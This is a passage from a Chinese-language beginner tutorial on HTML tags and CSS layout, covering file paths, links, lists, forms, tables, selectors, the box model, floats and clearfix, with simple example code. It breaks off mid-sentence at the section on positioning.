绝对路径和相对路径像网页上插入图片这种外部文件，需要定义文件的引用地址，引用外部文件还包括引用外部样式表，javascript等等，引用地址分为绝对地址和相对地址。绝对地址：相对于磁盘的位置去定位文件的地址相对地址：相对于引用文件本身去定位被引用的文件地址绝对地址在整体文件迁移时会因为磁盘和顶层目录的改变而找不到文件，相对路径就没有这个问题。相对路径的定义技巧：“ ./ ” 表示当前文件所在目录下，比如：“./pic.jpg” 表示当前目录下的pic.jpg的图片，这个使用时可以省略。“ ../ ” 表示当前文件所在目录下的上一级目录，比如：“../images/pic.jpg” 表示当前目录下的上一级目录下的images文件夹中的pic.jpg的图片。2.6 html链接标签标签可以在网页上定义一个链接地址，它的常用属性有：href属性 定义跳转的地址title属性 定义鼠标悬停时弹出的提示文字框target属性 定义链接窗口打开的位置target=”_self” 缺省值，新页面替换原来的页面，在原来位置打开target=”_blank” 新页面会在新开的一个浏览器窗口打开123&lt;a href="#"&gt;&lt;/a&gt; &lt;!-- # 表示链接到页面顶部 --&gt;&lt;a href="https://www.baidu.com/" title="跳转的百度网站"&gt;百度一下&lt;/a&gt;&lt;a href="2.html" target="_blank"&gt;测试页面2&lt;/a&gt;2.7 html列表标签2.7.1 有序列表在网页上定义一个有编号的内容列表可以用&lt;ol&gt;、&lt;li&gt;配合使用来实现，代码如下：12345&lt;ol&gt; &lt;li&gt;列表文字一&lt;/li&gt; &lt;li&gt;列表文字二&lt;/li&gt; &lt;li&gt;列表文字三&lt;/li&gt;&lt;/ol&gt;在网页上生成的列表，每条项目上会按1、2、3编号，有序列表在实际开发中较少使用。2.7.2 无序列表在网页上定义一个无编号的内容列表可以用&lt;ul&gt;、&lt;li&gt;配合使用来实现，代码如下：12345&lt;ul&gt; &lt;li&gt;&lt;a href="#"&gt;新闻标题一&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;新闻标题二&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;新闻标题三&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;在网页上生成的列表，每条项目上会有一个小图标，这个小图标在不同浏览器上显示效果不同，所以一般会用样式去掉默认的小图标，如果需要图标，可以用样式自定义图标，从而达到在不同浏览器上显示的效果相同,实际开发中一般用这种列表。定义列表通常用于术语的定义。标签表示列表的整体。标签定义术语的题目。标签是术语的解释。一个中可以有多个题目和解释，代码如下：1234567891011&lt;h3&gt;前端三大块&lt;/h3&gt;&lt;dl&gt; &lt;dt&gt;html&lt;/dt&gt; &lt;dd&gt;负责页面的结构&lt;/dd&gt; &lt;dt&gt;css&lt;/dt&gt; &lt;dd&gt;负责页面的表现&lt;/dd&gt; &lt;dt&gt;javascript&lt;/dt&gt; &lt;dd&gt;负责页面的行为&lt;/dd&gt;&lt;/dl&gt;2.8 html表单表单用于搜集不同类型的用户输入，表单由不同类型的标签组成，相关标签及属性用法如下：1、&lt;form&gt;标签 定义整体的表单区域action属性 定义表单数据提交地址method属性 定义表单提交的方式，一般有“get”方式和“post”方式2、&lt;label&gt;标签 为表单元素定义文字标注3、&lt;input&gt;标签 定义通用的表单元素type属性type=”text” 定义单行文本输入框type=”password” 定义密码输入框type=”radio” 定义单选框type=”checkbox” 定义复选框type=”file” 定义上传文件type=”submit” 定义提交按钮type=”reset” 定义重置按钮type=”button” 定义一个普通按钮type=”image” 定义图片作为提交按钮，用src属性定义图片地址type=”hidden” 定义一个隐藏的表单域，用来存储值value属性 定义表单元素的值name属性 定义表单元素的名称，此名称是提交数据时的键名4、&lt;textarea&gt;标签 定义多行文本输入框5、&lt;select&gt;标签 定义下拉表单元素6、&lt;option&gt;标签 与&lt;select&gt;标签配合，定义下拉表单元素中的选项2.8.1 注册表单实例：1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;form action="http://www..." method="get"&gt;&lt;p&gt;&lt;label&gt;姓名：&lt;/label&gt;&lt;input type="text" name="username" /&gt;&lt;/p&gt;&lt;p&gt;&lt;label&gt;密码：&lt;/label&gt;&lt;input type="password" name="password" /&gt;&lt;/p&gt;&lt;p&gt;&lt;label&gt;性别：&lt;/label&gt;&lt;input type="radio" name="gender" value="0" /&gt; 男&lt;input type="radio" name="gender" value="1" /&gt; 女&lt;/p&gt;&lt;p&gt;&lt;label&gt;爱好：&lt;/label&gt;&lt;input type="checkbox" name="like" value="sing" /&gt; 唱歌&lt;input type="checkbox" name="like" value="run" /&gt; 跑步&lt;input type="checkbox" name="like" value="swiming" /&gt; 游泳&lt;/p&gt;&lt;p&gt;&lt;label&gt;照片：&lt;/label&gt;&lt;input type="file" name="person_pic"&gt;&lt;/p&gt;&lt;p&gt;&lt;label&gt;个人描述：&lt;/label&gt;&lt;textarea name="about"&gt;&lt;/textarea&gt;&lt;/p&gt;&lt;p&gt;&lt;label&gt;籍贯：&lt;/label&gt;&lt;select name="site"&gt; &lt;option value="0"&gt;北京&lt;/option&gt; &lt;option value="1"&gt;上海&lt;/option&gt; &lt;option value="2"&gt;广州&lt;/option&gt; &lt;option value="3"&gt;深圳&lt;/option&gt;&lt;/select&gt;&lt;/p&gt;&lt;p&gt;&lt;input type="submit" name="" value="提交"&gt;&lt;!-- input类型为submit定义提交按钮 还可以用图片控件代替submit按钮提交，一般会导致提交两次，不建议使用。如： &lt;input type="image" src="xxx.gif"&gt;--&gt;&lt;input type="reset" name="" value="重置"&gt;&lt;/p&gt;&lt;/form&gt;2.9 html表格1、&lt;table&gt;标签：声明一个表格，它的常用属性如下：border属性 定义表格的边框，设置值是数值cellpadding属性 定义单元格内容与边框的距离，设置值是数值cellspacing属性 定义单元格与单元格之间的距离，设置值是数值align属性 设置整体表格相对于浏览器窗口的水平对齐方式,设置值有：left | center | right ，默认left2、&lt;tr&gt;标签：定义表格中的一行3、&lt;td&gt;和&lt;th&gt;标签：定义一行中的一个单元格，td代表普通单元格，th表示表头单元格，它们的常用属性如下：align 设置单元格中内容的水平对齐方式,设置值有：left | center | right ，默认leftvalign 设置单元格中内容的垂直对齐方式 top | middle | bottom ，默认topcolspan 设置单元格水平合并，设置值是数值rowspan 设置单元格垂直合并，设置值是数值表格制作练习：12345678910111213141516171819202122232425262728293031323334353637&lt;h1&gt;表格&lt;/h1&gt;&lt;table border="1" width="600" height="300" align="center"&gt; &lt;tr&gt; &lt;td colspan="5"&gt;基本情况&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width="25%"&gt;&lt;/td&gt; &lt;td width="15%"&gt;&lt;/td&gt; &lt;td width="25%"&gt;&lt;/td&gt; &lt;td width="15%"&gt;&lt;/td&gt; &lt;td rowspan="5" width="20%"&gt;&lt;img src="" alt="person"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;快速创建表格框架123456789101112131415161718192021222324252627282930比如：1. 输入table后按Tab键，就会出来一个&lt;table&gt;&lt;/table&gt;2. 输入table&gt;tr后按Tab键,就会出来一个&lt;table&gt; &lt;tr&gt;&lt;/tr&gt;&lt;/table&gt;3. 输入table&gt;tr&gt;td后按Tab键,就会出来一个&lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;4. 输入table&gt;tr&gt;td*2后按Tab键,就会出来一个&lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;5. 输入table&gt;(tr&gt;td*2)*2后按Tab键,就会出来一个&lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;2.10 页面布局概述布局也可以叫做排版，它指的是把文字和图片等元素按照我们的意愿有机地排列在页面上，布局的方式分为两种：1、table布局：通过table元素将页面空间划分成若干个单元格，将文字或图片等元素放入单元格中，隐藏表格的边框，从而实现布局。这种布局方式也叫传统布局，目前主要使用在EDM(广告邮件中的页面)中，主流的布局方式不用这种。2、HTML+CSS布局(DIV+CSS)：主要通过CSS样式设置来布局文字或图片等元素，需要用到CSS盒子模型、盒子类型、CSS浮动、CSS定位、CSS背景图定位等知识来布局，它比传统布局要复杂，目前是主流的布局方式。2.11 table布局及实例table来做整体页面的布局，布局的技巧归纳为如下几点：1、按照设计图的尺寸设置表格的宽高以及单元格的宽高。2、将表格border、cellpadding、cellspacing全部设置为0，表格的边框和间距就不占有页面空间，它只起到划分空间的作用。3、针对局部复杂的布局，可以在单元格里面再嵌套表格，嵌套表格划分局部的空间。4、单元格中的元素或者嵌套的表格用align和valign设置对齐方式5、通过属性或者css样式设置单元格中元素的样式3. CSSCSS是 Cascading Style Sheets 的首字母缩写，意思是层叠样式表。有了CSS，html中大部分表现样式的标签就废弃不用了，html只负责文档的结构和内容，表现形式完全交给CSS，html文档变得更加简洁。3.1 css基本语法及页面引用3.1.1 css基本语法css的定义方法是：选择器 { 属性:值; 属性:值; 属性:值;}选择器是将样式和页面元素关联起来的名称，属性是希望设置的样式属性每个属性有一个或多个值。代码示例：12345678910/* css注释 ctrl+shift+"/"*/div&#123; width:100px; height:100px; color:red &#125;3.1.2 css页面引入方法：1、外联式：通过link标签，链接到外部样式表到页面中。1&lt;link rel="stylesheet" type="text/css" href="css/main.css"&gt;2、嵌入式：通过style标签，在网页上创建嵌入的样式表。1234&lt;style type="text/css"&gt; div&#123; width:100px; height:100px; color:red &#125; ......&lt;/style&gt;3、内联式：通过标签的style属性，在标签上直接写样式。1&lt;div style="width:100px; height:100px; color:red "&gt;......&lt;/div&gt;3.2 css文本设置常用的应用文本的css样式：color 设置文字的颜色，如： color:red;font-size 设置文字的大小，如：font-size:12px;font-family 设置文字的字体，如：font-family:’微软雅黑’;font-style 设置字体是否倾斜，如：font-style:’normal’; 设置不倾斜，font-style:’italic’;设置文字倾斜font-weight 设置文字是否加粗，如：font-weight:bold; 设置加粗 font-weight:normal 设置不加粗line-height 设置文字的行高，设置行高相当于在每行文字的上下同时加间距， 如：line-height:24px;font 同时设置文字的几个属性，写的顺序有兼容问题，建议按照如下顺序写： font：是否加粗 字号/行高 字体；如： font:normal 12px/36px ‘微软雅黑’;text-decoration 设置文字的下划线，如：text-decoration:none; 将文字下划线去掉text-indent 设置文字首行缩进，如：text-indent:24px; 设置文字首行缩进24pxtext-align 设置文字水平对齐方式，如text-align:center 设置文字水平居中3.3 css颜色表示法css颜色值主要有三种表示方法：1、颜色名表示，比如：red 红色，gold 金色2、rgb表示，比如：rgb(255,0,0)表示红色3、16进制数值表示，比如：#ff0000 表示红色，这种可以简写成 #f003.4 css选择器常用的选择器有如下几种：3.4.1 标签选择器标签选择器，此种选择器影响范围大，建议尽量应用在层级选择器中。举例：123456*&#123;margin:0;padding:0&#125;div&#123;color:red&#125; &lt;div&gt;....&lt;/div&gt; &lt;!-- 对应以上两条样式 --&gt;&lt;div class="box"&gt;....&lt;/div&gt; &lt;!-- 对应以上两条样式 --&gt;3.4.2 id选择器通过id名来选择元素，元素的id名称不能重复，所以一个样式设置项只能对应于页面上一个元素，不能复用，id名一般给程序使用，所以不推荐使用id作为选择器。举例：123#box&#123;color:red&#125; &lt;div id="box"&gt;....&lt;/div&gt; &lt;!-- 对应以上一条样式，其它元素不允许应用此样式 --&gt;3.4.3 类选择器通过类名来选择元素，一个类可应用于多个元素，一个元素上也可以使用多个类，应用灵活，可复用，是css中应用最多的一种选择器。举例：1234567.red&#123;color:red&#125;.big&#123;font-size:20px&#125;.mt10&#123;margin-top:10px&#125; &lt;div class="red"&gt;....&lt;/div&gt;&lt;h1 class="red big mt10"&gt;....&lt;/h1&gt;&lt;p class="red mt10"&gt;....&lt;/p&gt;3.4.4 层级选择器主要应用在选择父元素下的子元素，或者子元素下面的子元素，可与标签元素结合使用，减少命名，同时也可以通过层级，防止命名冲突。举例：12345678910.box span&#123;color:red&#125;.box .red&#123;color:pink&#125;.red&#123;color:red&#125;&lt;div class="box"&gt; &lt;span&gt;....&lt;/span&gt; &lt;a href="#" class="red"&gt;....&lt;/a&gt;&lt;/div&gt;&lt;h3 class="red"&gt;....&lt;/h3&gt;3.4.5 组选择器多个选择器，如果有同样的样式设置，可以使用组选择器。举例：12345678.box1,.box2,.box3&#123;width:100px;height:100px&#125;.box1&#123;background:red&#125;.box2&#123;background:pink&#125;.box3&#123;background:gold&#125;&lt;div class="box1"&gt;....&lt;/div&gt;&lt;div class="box2"&gt;....&lt;/div&gt;&lt;div class="box3"&gt;....&lt;/div&gt;3.4.6 伪类及伪元素选择器常用的伪类选择器有hover，表示鼠标悬浮在元素上时的状态，伪元素选择器有before和after,它们可以通过样式在元素中插入内容。12345678.box1:hover&#123;color:red&#125;.box2:before&#123;content:'行首文字';&#125;.box3:after&#123;content:'行尾文字';&#125;&lt;div class="box1"&gt;....&lt;/div&gt;&lt;div class="box2"&gt;....&lt;/div&gt;&lt;div class="box3"&gt;....&lt;/div&gt;3.5 CSS盒子模型3.5.1 盒子模型解释元素(标签)在页面中显示成一个方块，类似一个盒子，CSS盒子模型就是使用现实中盒子来做比喻，帮助我们设置元素对应的样式。盒子模型示意图如下：把元素叫做盒子，设置对应的样式分别为：盒子的宽度(width)、盒子的高度(height)、盒子的边框(border)、盒子内的内容和边框之间的间距(padding)、盒子与盒子之间的间距(margin)。3.5.2 设置宽高12width:200px; /* 设置盒子的宽度，此宽度是指盒子内容的宽度，不是盒子整体宽度(难点) */ height:200px; /* 设置盒子的高度，此高度是指盒子内容的高度，不是盒子整体高度(难点) */3.5.3 设置边框设置一边的边框，比如顶部边框，可以按如下设置：1234border-top-color:red; /* 设置顶部边框颜色为红色 */ border-top-width:10px; /* 设置顶部边框粗细为10px */ border-top-style:solid; /* 设置顶部边框的线性为实线，常用的有：solid(实线) dashed(虚线) dotted(点线); */上面三句可以简写成一句：1border-top:10px solid red; /* 顺序无所谓，怎么写都可以 */设置其它三个边的方法和上面一样，把上面的’top’换成’left’就是设置左边，换成’right’就是设置右边，换成’bottom’就是设置底边。四个边如果设置一样，可以将四个边的设置合并成一句：1border:10px solid red;3.5.4 设置内间距padding设置盒子四边的内间距，可设置如下：1234padding-top：20px; /* 设置顶部内间距20px */ padding-left:30px; /* 设置左边内间距30px */ padding-right:40px; /* 设置右边内间距40px */ padding-bottom:50px; /* 设置底部内间距50px */上面的设置可以简写如下：12padding：20px 40px 50px 30px; /* 四个值按照顺时针方向，分别设置的是 上 右 下 左 四个方向的内边距值。 */padding后面还可以跟3个值，2个值和1个值，它们分别设置的项目如下：123padding：20px 40px 50px; /* 设置顶部内边距为20px，左右内边距为40px，底部内边距为50px */ padding：20px 40px; /* 设置上下内边距为20px，左右内边距为40px*/ padding：20px; /* 设置四边内边距为20px */3.5.5 设置外间距margin外边距的设置方法和padding的设置方法相同，将上面设置项中的’padding’换成’margin’就是外边距设置方法。3.5.6 理解练习通过盒子模型的原理，制作下面的盒子：123456789.box &#123; width: 140px; height: 140px; background-color: gold; border: black 10px solid; padding: 20px;&#125;&lt;div class="box"&gt;盒子里面的文字内容，距离边框有一定距离。&lt;/div&gt;3.6 盒模型的实际尺寸按照下面代码制作页面：123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;盒子的真实尺寸&lt;/title&gt; &lt;style type="text/css"&gt; .box01&#123;width:50px;height:50px;background-color:gold;&#125; .box02&#123;width:50px;height:50px;background-color:gold;border:50px solid #000&#125; .box03&#123;width:50px;height:50px;background-color:gold;border:50px solid #000;padding: 50px;&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box01"&gt;1&lt;/div&gt; &lt;br /&gt; &lt;div class="box02"&gt;2&lt;/div&gt; &lt;br /&gt; &lt;div class="box03"&gt;3&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;页面显示效果如下：通过上面的页面得出结论：盒子的width和height设置的是盒子内容的宽和高，不是盒子本身的宽和高，盒子的真实尺寸计算公式如下：盒子宽度 = width + padding左右 + border左右盒子高度 = height + padding上下 + border上下理解练习通过盒子模型的原理，制作下面的盒子：1234567891011121314.box &#123; width: 380px; height: 35px; font-size: 20px; font-family: "Microsoft YaHei"; color: #333; border-top: 1px solid #ff0000; border-bottom: 3px solid #666666; padding-top: 15px; padding-left: 20px; line-height: 20px;&#125;&lt;div class="box"&gt;新闻列表&lt;/div&gt;3.7 盒模型使用技巧及相关问题3.7.1 margin相关技巧1、设置元素水平居中： margin:x auto;2、margin负值让元素位移及边框合并理解练习1、制作一个600*100的盒子，边框1像素黑色，距离浏览器顶部100px，水平居中。123456789101112body &#123; margin: 0;&#125;.box &#123; width: 598px; height: 98px; border: 1px black solid; margin: 100px auto;&#125;&lt;div class="box"&gt;&lt;/div&gt;2、制作下面的菜单效果：1234567891011121314151617181920212223242526body &#123; margin: 0; /* body标签本身带有8像素的间隔，需要去掉这个盒子才能贴边 */&#125;.box &#123; width: 200px; height: 150px; margin: 50px auto 0; /* 设置auto表示水平居中 */ background-color: gold;&#125;.box div&#123; width: 200px; height: 30px; border: 1px green solid; background-color: gold; margin-top: -1px; /* 设置负值表示边框重叠 */&#125;&lt;div class="box"&gt; &lt;div class="box1"&gt;&lt;/div&gt; &lt;div class="box2"&gt;&lt;/div&gt; &lt;div class="box3"&gt;&lt;/div&gt; &lt;div class="box4"&gt;&lt;/div&gt; &lt;div class="box5"&gt;&lt;/div&gt;&lt;/div&gt;3.7.2 外边距合并外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。解决方法如下：1、使用这种特性2、设置一边的外边距，一般设置margin-top3、将元素浮动或者定位理解练习使用div标签制作如下布局:123456789101112131415161718192021222324252627282930313233.box &#123; width: 500px; border: 1px solid black; margin: 50px auto 0;&#125;.box div &#123; margin-left: 20px; margin-right: 20px; margin-top: 20px; /* 中间的间隔应该是40px,但是因为是合并，实际是20px*/ margin-bottom: 20px;&#125;/* 或者使用如下的这个汇总形式.box div &#123; margin: 20px;&#125;*/&lt;div class="box"&gt; &lt;div&gt; 外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。 &lt;/div&gt; &lt;div&gt; 外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。 &lt;/div&gt; &lt;div&gt; 外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。 &lt;/div&gt; &lt;div&gt; 外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。 &lt;/div&gt;&lt;/div&gt;3.7.3 margin-top 塌陷在两个盒子嵌套时候，内部的盒子设置的margin-top会加到外边的盒子上，导致内部的盒子margin-top设置失败，解决方法如下：1、外部盒子设置一个边框2、外部盒子设置 overflow:hidden3、使用伪元素类：1234.clearfix:before&#123; content: ''; display:table;&#125;理解练习分别使用margin间距和padding间距制作下面的例子： 第一个图123456789101112131415161718.box &#123; width: 200px; height: 200px; background-color: gold; border: 1px solid black;&#125;.box1 &#123; width: 120px; height: 50px; background-color: green; margin: 75px auto 40px;&#125;&lt;div class="box"&gt; &lt;div class="box1"&gt; &lt;/div&gt;&lt;/div&gt;第二个图123456789101112131415161718192021222324.box &#123; width: 200px; height: 200px; background-color: gold; /*border: 1px solid black; 第一种解决塌陷的方法：给外部盒子加个边框 */ /*overflow: hidden; 第二种解决塌陷的方法：处理css外部溢出 */&#125;.box1 &#123; width: 120px; height: 50px; background-color: green; margin: 75px auto 40px;&#125;.box:before&#123; /* 第三种解决塌陷的方法：使用伪元素类，推荐使用这个*/ content: ''; display:table;&#125;&lt;div class="box"&gt; &lt;div class="box1"&gt; &lt;/div&gt;&lt;/div&gt;3.8 css元素溢出当子元素的尺寸超过父元素的尺寸时，需要设置父元素显示溢出的子元素的方式，设置的方法是通过overflow属性来设置。overflow的设置项：1、visible 默认值。内容不会被修剪，会呈现在元素框之外。2、hidden 内容会被修剪，并且其余内容是不可见的，此属性还有清除浮动、清除margin-top塌陷的功能。3、scroll 内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。4、auto 如果内容被修剪，则浏览器会显示滚动条以便查看其余的内容。5、inherit 规定应该从父元素继承 overflow 属性的值。元素溢出示例：3.9 块元素、内联元素、内联块元素元素就是标签，布局中常用的有三种标签，块元素、内联元素、内联块元素，了解这三种元素的特性，才能熟练的进行页面布局。3.9.1 块元素块元素，也可以称为行元素，布局中常用的标签如：div、p、ul、li、h1~h6、dl、dt、dd等等都是块元素，它在布局中的行为：支持全部的样式如果没有设置宽度，默认的宽度为父级宽度100%盒子占据一行、即使设置了宽度3.9.2 内联元素内联元素，也可以称为行内元素，布局中常用的标签如：a、span、em、b、strong、i等等都是内联元素，它们在布局中的行为：支持部分样式（不支持宽、高、margin上下、padding上下）宽高由内容决定盒子并在一行代码换行，盒子之间会产生间距子元素是内联元素，父元素可以用text-align属性设置子元素水平对齐方式解决内联元素间隙的方法1、去掉内联元素之间的换行2、将内联元素的父级设置font-size为0，内联元素自身再设置font-size3.9.3 内联块元素内联块元素，也叫行内块元素，是新增的元素类型，现有元素没有归于此类别的，img和input元素的行为类似这种元素，但是也归类于内联元素，我们可以用display属性将块元素或者内联元素转化成这种元素。它们在布局中表现的行为：支持全部样式如果没有设置宽高，宽高由内容决定盒子并在一行代码换行，盒子会产生间距子元素是内联块元素，父元素可以用text-align属性设置子元素水平对齐方式。这三种元素，可以通过display属性来相互转化，不过实际开发中，块元素用得比较多，所以我们经常把内联元素转化为块元素，少量转化为内联块，而要使用内联元素时，直接使用内联元素，而不用块元素转化了。3.9.4 display属性display属性是用来设置元素的类型及隐藏的，常用的属性有：1、none 元素隐藏且不占位置2、block 元素以块元素显示3、inline 元素以内联元素显示4、inline-block 元素以内联块元素显示课堂练习请制作图中所示的菜单：123456789101112131415161718192021222324252627282930313233343536373839&lt;style type="text/css"&gt; .menu &#123; width: 694px; height: 50px; margin: 50px auto 0; font-size: 0; /* 解决内联元素间隙：父级设置font-size为0，内联元素自身再设置font-size */ &#125; .menu a &#123; width: 98px; height: 48px; background-color: #ffffff; /* 背景色 */ display: inline-block; /* 行内块 */ font-size: 16px; /* 字体大小 */ font-family: "Microsoft YaHei"; /* 字体样式 */ color: pink; /* 字体颜色 */ border: 1px solid gold; /* 边框线 */ margin-left: -1px; /* 去掉重叠的边框线 */ text-align: center; /* 文字水平居中 */ line-height: 48px; /* 文字垂直居中 */ text-decoration: none; /* 去掉超链接下划线 */ &#125; .menu a:hover &#123; /* 伪类 */ background-color: gold; color: white; &#125;&lt;/style&gt;&lt;div class="menu"&gt; &lt;a href="#"&gt;首页&lt;/a&gt; &lt;a href="#"&gt;公司简介&lt;/a&gt; &lt;a href="#"&gt;解决方案&lt;/a&gt; &lt;a href="#"&gt;公司新闻&lt;/a&gt; &lt;a href="#"&gt;行业动态&lt;/a&gt; &lt;a href="#"&gt;招贤纳士&lt;/a&gt; &lt;a href="#"&gt;联系我们&lt;/a&gt;&lt;/div&gt;display属性扩展none 元素隐藏且不占位置以下示例是元素默认隐藏不显示，只有当鼠标放在元素上时才会显示出来1234567891011121314151617181920212223.con &#123; width: 200px;&#125;.con h3&#123; font-size: 30px;&#125;.box2&#123; width: 200px; height: 200px; background-color: gold; font-size: 16px; display: none;&#125;.con:hover .box2&#123; display: block;&#125;&lt;div class="con"&gt; &lt;h3&gt;文字标题&lt;/h3&gt; &lt;div class="box2"&gt;文字标题的说明&lt;/div&gt;&lt;/div&gt;3.10 浮动3.10.1 浮动特性1、浮动元素有左浮动(float:left)和右浮动(float:right)两种2、浮动的元素会向左或向右浮动，碰到父元素边界、其他元素才停下来3、相邻浮动的块元素可以并在一行，超出父级宽度就换行4、浮动让行内元素或块元素自动转化为行内块元素(此时不会有行内块元素间隙问题)5、浮动元素后面没有浮动的元素会占据浮动元素的位置，没有浮动的元素内的文字会避开浮动的元素，形成文字饶图的效果6、父元素如果没有设置尺寸(一般是高度不设置)，父元素内整体浮动的元素无法撑开父元素，父元素需要清除浮动7、浮动元素之间没有垂直margin的合并理解练习1、两端对齐浮动12345678910111213141516171819202122232425262728293031323334&lt;style type="text/css"&gt; .con&#123; width: 400px; height: 80px; border: 1px solid gold; margin: 50px auto 0; &#125; .con div&#123; width: 60px; height: 60px; display: inline-block; margin: 10px; &#125; .box01&#123; background-color: #90ee90; float: left; &#125; .box02&#123; background-color: pink; float: right; &#125;&lt;/style&gt;&lt;!--div.con&gt;div.box01--&gt;&lt;div class="con"&gt; &lt;div class="box01"&gt;&lt;/div&gt; &lt;div class="box02"&gt;&lt;/div&gt;&lt;/div&gt;2、请使用浮动制作图中所示的菜单：1234567891011121314151617181920212223242526272829303132333435363738394041424344.menu &#123; width: 694px; height: 50px; list-style: none; /* 去掉无序列表前面的小圆点 */ margin: 50px auto 0; /* 覆盖原始的ul margin */ padding: 0; /* 覆盖原始的ul padding */&#125;.menu li&#123; width: 98px; height: 48px; border: 1px solid gold; background-color: white; /*display: inline-block;*/ float: left; margin-left: -1px;&#125;.menu li a&#123; display: block; width: 98px; height: 48px; text-align: center; line-height: 48px; text-decoration: none; font-size: 16px; font-family: "Microsoft YaHei"; color: pink;&#125;.menu li a:hover&#123; background-color: gold; color: white;&#125;&lt;ul class="menu"&gt; &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;3、文字饶图效果:123456789101112131415161718192021222324252627282930&lt;style type="text/css"&gt; .con&#123; width: 450px; height: 210px; border: 1px solid black; margin: 50px auto 0; &#125; .pic&#123; width: 80px; height: 80px; background-color: gold; float: left; margin: 10px; &#125; .text&#123; height: 130px; /*background-color: green;*/ color: #666; &#125;&lt;/style&gt;&lt;div class="con"&gt; &lt;div class="pic"&gt;&lt;/div&gt; &lt;div class="text"&gt;浮动元素后面没有浮动的元素会占据浮动元素的位置，没有浮动的元素内的文字会避开浮动的元素，形成文字饶图的效果浮动元素后面没有浮动的元素会占据浮动元素的位置，没有浮动的元素内的文字会避开浮动的元素，形成文字饶图的效果浮动元素后面没有浮动的元素会占据浮动元素的位置，没有浮动的元素内的文字会避开浮动的元素，形成文字饶图的效果&lt;/div&gt;&lt;/div&gt;3.10.2 清除浮动父级上增加属性overflow：hidden在最后一个子元素的后面加一个空的div，给它样式属性 clear:both（不推荐）使用成熟的清浮动样式类，clearfix123.clearfix:after,.clearfix:before&#123; content: "";display: table;&#125;.clearfix:after&#123; clear:both;&#125;.clearfix&#123;zoom:1;&#125;清除浮动的使用方法：123.con2&#123;... overflow:hidden&#125;或者&lt;div class="con2 clearfix"&gt;理解练习父级盒子不给高度，子集盒子浮动，父级盒子需要清除浮动1234567891011121314151617181920212223242526272829303132333435363738394041424344454647.list&#123; width: 210px; /*height: 400px;*/ border: 1px solid #000000; margin: 50px auto 0; list-style: none; padding: 0; /* 第一种清除浮动的方法 */ /*overflow: hidden;*/&#125;.list li&#123; width: 50px; height: 50px; background-color: gold; margin: 10px; float: left;&#125;/* 第二种清除浮动的方法 */.clearfix:after,.clearfix:before&#123; content: ""; display: table;&#125;.clearfix:after&#123; clear:both;&#125;/* 兼容IE，网页不缩放 */.clearfix&#123; zoom:1;&#125;&lt;!--ul.list&gt;li&#123;$&#125;*8--&gt;&lt;ul class="list clearfix"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt; &lt;li&gt;7&lt;/li&gt; &lt;li&gt;8&lt;/li&gt; &lt;!--第二种清除浮动的方法--&gt; &lt;!--&lt;div style="clear: both"&gt;&lt;/div&gt;--&gt;&lt;/ul&gt;3.11 定位3.11.1 文档流文档流，是指盒子按照html标签编写的顺序依次从上到下，从左到右排列，块元素占一行，行内元素在一行之内从左到右排列，先写的先排列，后写的排在后面，每个盒子都占据自己的位置。3.11.2 关于定位我们可以使用css的position属性来设置元素的定位类型，postion的设置项如下：relative 生成相对定位元素，元素所占据的文档流的位置保留，元素本身相对自身原位置进行偏移。absolute 